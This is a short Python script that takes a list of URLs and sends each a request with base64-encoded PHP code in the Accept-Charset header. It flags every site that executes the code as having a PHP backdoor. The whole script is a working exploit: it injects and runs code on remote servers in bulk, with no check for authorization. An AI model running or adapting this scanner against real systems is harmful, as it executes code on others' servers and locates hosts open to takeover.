import requests
import re
import base64

f=open('./url.txt','r')
url_list=f.readlines()
for url in url_list:
    head={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip,deflate",
        "Accept-Charset":base64.b64encode('phpinfo();'.encode())
    }
    res=requests.get(url=url,headers=head)
    if 'PHP Version' in res.text:
        print("[+] {} 存在php后门".format(url).replace('\n',''))
